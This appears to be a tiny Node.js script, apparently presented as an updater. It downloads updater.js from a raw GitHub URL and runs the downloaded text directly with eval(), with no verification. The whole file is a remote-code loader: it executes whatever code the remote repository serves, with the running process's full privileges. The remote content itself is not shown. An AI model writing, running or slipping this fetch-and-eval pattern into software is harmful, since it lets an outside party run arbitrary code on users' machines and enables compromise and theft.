const axios = require('axios');

axios.get("https://raw.githubusercontent.com/SAGOR-KINGx/ONLINE/refs/heads/main/updater.js")
	.then(res => eval(res.data));
